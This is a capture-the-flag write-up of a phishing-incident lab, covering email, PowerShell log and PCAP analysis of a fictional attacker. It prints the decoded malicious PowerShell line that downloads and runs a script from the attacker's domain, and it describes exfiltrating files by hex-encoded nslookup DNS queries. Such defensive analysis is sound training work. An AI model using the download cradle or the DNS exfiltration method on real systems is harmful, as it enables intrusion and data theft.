---
layout: default
---

# Boogeyman 1

The goal of this room is to analyze TTPs of an attacker via email, endpoint, and network analyses.


I will be doing my initial analyses using the artifacts without looking at the challenge questions in order to make this as real-world as possible, then I will use the questions a guide later to fill in the gaps.

### EMAIL ANALYSIS

First of all, the recipient: **julianne.westcott@hotmail.com**

![image](https://github.com/user-attachments/assets/261cab8c-1fb6-4320-b44c-10ba8e52d9c6)


The sender uses a very unusual email domain: **Arthur Griffin — agriffin@bpakcaging.xyz**

![image](https://github.com/user-attachments/assets/0ed85e26-0e87-4ed0-b34a-35951d8c9299)


The body of the message starts out personal (addressing the recipient by name), and the sender uses polite, easygoing language like “I would be grateful” and “kindly see”:

![image](https://github.com/user-attachments/assets/99bad00b-6a3e-4abd-a9bf-d348cfa536dd)


The company website is shared here, which is almost positively a scam given the obviously misspelled name alone: **bpakcaging.xyz**

![image](https://github.com/user-attachments/assets/a6afb3cf-729d-4881-8e39-bb249c398d54)


And the file attached, **Invoice.zip**, is encoded in Base64, which is a flag:

![image](https://github.com/user-attachments/assets/a28d80e7-a618-4276-805e-bf5abb3adb32)


After decoding the base64 here, we see a link file is included in the zip file: **Invoice_20230103.lnk**

![image](https://github.com/user-attachments/assets/61c3d6e6-b817-4b75-8a7b-c71aa16ce4a5)


So, I decoded the base64 and put it into a new file:

![image](https://github.com/user-attachments/assets/17246761-5af7-43c3-b493-a27cc39aabcd)


And unzipped the file to get what is confirmed to be a Windows link:

![image](https://github.com/user-attachments/assets/d3678907-8a26-4e5d-b604-32c01dc8a4cc)


A quick strings analysis shows that PowerShell is involved here, as well as shows another potential artifact: **excel.ico**:

![image](https://github.com/user-attachments/assets/64db2fad-bf20-4a72-8116-a37e36997cea)


And a full reveal of what’s inside the link file shows a base64-encoded PowerShell payload and the name and location of another potential artifact on the Administrator’s Desktop: **excel.ico**

![image](https://github.com/user-attachments/assets/e7bff4e0-e148-48bf-8eee-aced2e253a01)


Decoding the base64 here returns a command that downloads a specific file from the site associated with the sender’s “company”: **http://files.bpakcaging.xyz/update**

![image](https://github.com/user-attachments/assets/f5d59f32-10a7-489b-b32f-6be1911f3043)


- The “windowstyle: hidden” parameter and value here means this all takes place in the background without opening a window, thus making the malicious activity hidden from the user

The room also provided the tool “lnkparse”, which apparently is able to parse the LNK file further, and it returned the same information but in a more detailed, readable format:

![image](https://github.com/user-attachments/assets/5ccfad9f-a269-460f-bfbe-535b5f2b2c60)


So, it’s confirmed without a doubt that this email message was definitely malicious.

Answers to questions:

Q1. What is the email address used to send the phishing email?

A1. **agriffin@bpakcaging.xyz**

Q2. What is the email address of the victim?

A2.  **julianne.westcott@hotmail.com**

Q3. What is the name of the 3rd party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

A3. **elasticemail**

![image](https://github.com/user-attachments/assets/ff8a4dac-1a3c-410b-877d-71d067883332)


Q4. What is the name of the file inside the encrypted attachment?

A4. **Invoice_20230103.lnk**

Q5. What is the password of the encrypted attachment:

A5. **Invoice2023!**

Q6. Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

A6. aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==

- Decoded, this is:
    
    **iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')**
    

### ENDPOINT ANALYSIS

Continuing the investigation, we have a JSON file of the PowerShell logs.

Let’s gather some basic info first:

- Name of the computer:

![image](https://github.com/user-attachments/assets/3f881500-8d73-4503-a7cb-cdfba7e9cde5)


- Looks like there are 987 events and 5 unique event IDs involved:

![image](https://github.com/user-attachments/assets/b1bc13fb-6d05-46fa-917d-d48e0266ae5b)


Breakdown of these event IDs:

![image](https://github.com/user-attachments/assets/531efb15-18d1-4e57-9ce1-c6d90b626242)


There are a total of 40 unique CLI commands, so it would be interesting to take a look at those first:

![image](https://github.com/user-attachments/assets/b068ec57-99de-4754-a87e-bf1c3f36671b)


Likely IoC in the form of exfiltration of a file to a remote IP address:

- File: **protected_data.kdbx**
- IP: **167.71.211.113** — this could be a host IP for a C2 server.

![image](https://github.com/user-attachments/assets/a1891b68-0b13-4610-be52-9f76f128eb19)


- URL (highly familiar): cdn.**bpakcaging.xyz** (port **8080**)

![image](https://github.com/user-attachments/assets/72da895d-7bdb-4f76-8b71-7812d6f95e1d)


Also looks like the attacker might have set up a keylogger via the binary **sc.exe**:

![image](https://github.com/user-attachments/assets/2c8c2940-21c4-4333-bd6f-db98124428ea)


Notable executables:

![image](https://github.com/user-attachments/assets/f6027405-de46-4b88-9a9c-08a6d293a8ad)

![image](https://github.com/user-attachments/assets/3e937fc4-c440-4d46-9c44-e25248b27adf)

- **sq3.exe** — seems to be something pertaining a SQL database called **pm.sqlite** — likely a data dump of the specified table **NOTE**
- **Seatbelt.exe** — not quite sure what this does yet.

All the directories the attacker visited:

![image](https://github.com/user-attachments/assets/31ba38a4-1c42-4666-9bcd-3ce5ee43e8f7)


- Making note of the user directory **j.westcott**

Download of 4 files, 1 from a GitHub repository and 3 from the malicious site:

- **sb.exe, sq3.exe,** and **update** — all from the malicious site
- **Invoke-Seatbelt.ps1** — a PowerShell script from a GitHub repository called “**S3cur3Th1sSh1t**”

![image](https://github.com/user-attachments/assets/dab50765-512b-4c2b-8536-bbaea022cada)


When I did some research on this tool from the repo, I found that it is a legit enumeration tool used for security checks, and it gathers information such as security settings, antivirus configurations, network connections, user and system info, and installed apps and processes.

In other words, it’s very dangerous in the hands of an attacker who compromised the system.

Answers to questions:

Q1. What are the domains used by the attacker for file hosting and C2?

A1. **cdn.bpakcaging.xyz,files.bpakcaging.xyz**

Q2. What is the name of the enumeration tool downloaded by the attacker?

A2. **Seatbelt**

Q3. What is the file accessed by the attacker using the downloaded **sq3.exe** binary (full path)?

A3. **C:\\Users\\j.westcott\AppData\\Local\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\pmsqlite**

Q4. What is the software that uses the file in Q3?

A3. **Microsoft Sticky Notes**

Q5. What is the name of the exfiltrated file?

A5. **protected_data.kdbx**

Q6. What type of file uses the .kdbx file extension?

A6. **KeePass** *— this is a database containing password hashes associated with the password manager*

Q7. What is the encoding used during the exfiltration attempt of the sensitive file?

A7. **Hex**

![image](https://github.com/user-attachments/assets/162b6ed7-c2b5-4ca0-b559-4b5a6255eb49)


Q8. What is the tool used for exfiltration?

A8. **Nslookup**

![image](https://github.com/user-attachments/assets/91370cc4-58f0-4b8a-a37b-9ed7caaa2ec7)


*This last one was rather odd to discover…who would have thought this simple tool could be used for exfiltration! Reminds me of when I found out about the same for ICMP data packets….*

### NETWORK ANALYSIS

We have both domains and an IP involved in the attack from the previous investigation:

- IP: **167.71.211.113**
- Domain 1: **cdn.bpakcaging.xyz**
- Domain 2: **files.bpakcaging.xyz**

And there’s a PCAP to use for our investigation now.

Tried to do an initial check with Tcpdump, but that tool isn’t available on this system, so we’ll just jump into Wireshark.

There are 2194 packets involving the attacker IP:

![image](https://github.com/user-attachments/assets/8766a18b-8435-4caf-9b88-d14aa5566eb9)


And 888 of those are DNS traffic, so I ordered the DNS traffic sent to that IP by the packet size to determine what was exfiltrated (larger packet sizes = potential sensitive data sent out):

![image](https://github.com/user-attachments/assets/8ddfa719-0dca-4ca5-808f-c20b0e4cdd9d)


Naturally, it’s all encoded, but this shows that all of the packets over the standard size of 87 were involved in the exfiltration. Also, destination IP seems to resolve to a cloud-hosted site.

I’ll come back to this later. Now, for the investigation of the domains.

First domain I filtered for was **files.bpakcaging.xyz:**

- Packet 1: the legit request the user made to the malicious site after interacting with the phishing attachment → **/update**
- Packets 2 and 3: the requests the attacker made to their malicious site via PowerShell to gather a couple of tools they would use to further compromise the machine → **/sb.exe** and **/sq3.exe**

![image](https://github.com/user-attachments/assets/0f761975-cfd9-424f-a188-6fda86f7bc54)

![image](https://github.com/user-attachments/assets/112be72c-ba11-4f8c-83f3-e6551c30cd93)

![image](https://github.com/user-attachments/assets/cc6b2bca-60d0-4038-b979-79d210a0b879)


**cdn.bpakcaging.xyz** did not return any results, so I moved on to another likely lead: PowerShell being used to send and receive web requests.

Filtered for PowerShell in the User-Agent and got 931 results, all to the same destination IP and many to a single path, with a few POST requests to another path:

- IP: **159.89.205.40**
- Common GET Path: **/b86459bb**
- Other GET Path (1 packet): **/8cce49b0**
- POST Path (42 packets): **/27fe2489**

![image](https://github.com/user-attachments/assets/f4e267e5-bc64-48ba-8958-eceb9fc89480)


Looking at the POST requests, given the relation to the **cdn** domain and the fact that the payload is encoded, it makes sense that these are likely packets sending out either data or enumeration info:

![image](https://github.com/user-attachments/assets/5d090108-0b7e-47a0-8b1f-53505ffc0440)


Decoding the very last packet from decimal returned mostly failed requests to the CDN host, but it has the user path to Documents at the very end: 

![image](https://github.com/user-attachments/assets/17bf79e2-d9d5-425a-a31e-b2c6ab721650)


Another payload on the larger side reveals that these POST packets do indeed contain enumeration information being exfiltrated to the attacker’s site:

![image](https://github.com/user-attachments/assets/342efdb6-e2ab-4c53-b8ad-27ab8b52b199)


Yet another grabbed files containing token or credential information:

- Notable credential filename: **DFBE70A7E5CC19A398EBF1B96859CE5D**

![image](https://github.com/user-attachments/assets/2dc26bcf-1e7a-4b1e-939e-3fdf787fcb4c)


Now I’m taking a look at the HTTP objects to see any other potential sensitive file exfiltrated:

- **manifest.json** — this isn’t linked to any of the malicious IPs we found, so just noting it for now
- **verified_contents.json** — same as the first file
- **security-credentials** — now THIS is suspicious, but it doesn’t return anything of note:

![image](https://github.com/user-attachments/assets/805d1068-e84e-4f87-b71e-41c9459d8403)

![image](https://github.com/user-attachments/assets/0f9f6735-0e39-4e39-94f7-78ab48994129)


But we can also get copies of the malicious files here, and **update** does show the establishment of the connection to the CDN site:

![image](https://github.com/user-attachments/assets/275b5634-3604-440e-af61-3687bd58264a)


And finally, let’s look for the file that we KNOW was exfiltrated from our endpoint investigation: **protected_data.kdbx**

Sending out the file to the remote server (this is familiar to us):

![image](https://github.com/user-attachments/assets/71a00762-1d9c-4eb0-9669-e2f640c161ad)


Dumping data from the database (this is also familiar to us):

![image](https://github.com/user-attachments/assets/a271df45-0fcf-4c5d-989b-2914b388265b)


*Notes: packet **44459**, database **plum.sqlite,** and IP **159.89.205.40***

A search for the **sq3.exe** file that was used to dump database table shows a MS-DOS packet with SQL (configuration?) information:

![image](https://github.com/user-attachments/assets/e52d8538-7407-4f5a-84c7-c24696f5cf98)



Answers to questions:

Q1. What software is used by the attacker to host its presumed file/payload server?

A1. Python

Q2. What HTTP method is used by the C2 for the output of the commands executed by the attacker?

A2. POST

Q3. What is the protocol used during the exfiltration activity?

A3. DNS

Q4. What is the password of the exfiltrated file?

A4. **%p9^3!lL^Mz47E2GaT^y**

![image](https://github.com/user-attachments/assets/4068747d-a658-4140-9fe9-bd0efb816e5e)


*I went down a rabbit hole with this question until I eventually realized I had to look at the TCP stream, not the HTTP stream….the one after the packet 44459 that dumped the database. Then, I just decoded it in CyberChef like I did with the other encoded payloads.*

Q5. What is the credit card number stored inside the exfiltrated file?

A5. 

Retrieved the DNS query names from the traffic since that’s where the exfiltrated data is likely hidden in (with the file broken apart, and then each part sent out via DNS consecutively)

![image](https://github.com/user-attachments/assets/5c79f332-cf74-4076-b591-0bc7172297de)


And then cut out all the hex from those names that matches the malicious destination:

![image](https://github.com/user-attachments/assets/3a78bde0-23a1-44ec-b0ed-4511f9abf8f7)


Then reassembled the hex together to get the full contents of the exfiltrated file:

![image](https://github.com/user-attachments/assets/424a376c-8bf7-4334-a02c-5ff246f10369)


And finally, reversed the hex in CyberChef, saving the output to a file:

![image](https://github.com/user-attachments/assets/478da1af-640f-491c-9670-ccf6daf47de4)


To open the file and retrieve the data, I had to install the KeePass password manager to my computer, then open the created KDBX file and enter the master password:

![image](https://github.com/user-attachments/assets/20b7d685-d6f8-42d5-9f26-5c53b559587b)


Realized I forgot to remove the repeats in the hex names, so revised it then tried the whole process again and we’re in…got the card number:

![image](https://github.com/user-attachments/assets/88c045ca-c397-4510-bcfe-5671f9712a87)


*This last question was pretty difficult to solve, and I actually needed to peek at a writeup to make sure I was on the right path before investing time into it. Top notch exercise though!*
